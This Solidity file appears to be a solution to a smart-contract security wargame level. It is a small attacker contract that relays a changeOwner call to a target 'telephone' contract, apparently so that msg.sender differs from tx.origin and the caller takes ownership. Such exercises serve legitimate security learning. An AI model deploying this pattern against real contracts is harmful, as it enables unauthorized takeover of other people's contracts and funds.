// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract Solution4 {
  address telephoneContract;
  
  constructor(address telephone) {
    telephoneContract = telephone;
  }

  function changeOwner(address _owner) public {
    ITelephone(telephoneContract).changeOwner(_owner);
  }
}